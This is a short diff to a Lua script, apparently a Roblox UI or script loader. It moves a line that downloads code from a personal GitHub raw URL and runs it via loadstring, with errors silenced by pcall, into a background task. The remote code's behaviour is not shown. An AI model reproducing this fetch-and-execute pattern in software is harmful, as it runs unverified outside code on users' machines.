@@ -50,8 +50,10 @@ local function safeCall(context, callback, ...)
 	end
 end
 
-pcall(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/MelyOVO/B/refs/heads/main/F.lua"))()
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/MelyOVO/B/refs/heads/main/F.lua"))()
+	end)
 end)
 
 local ToggleUI = false
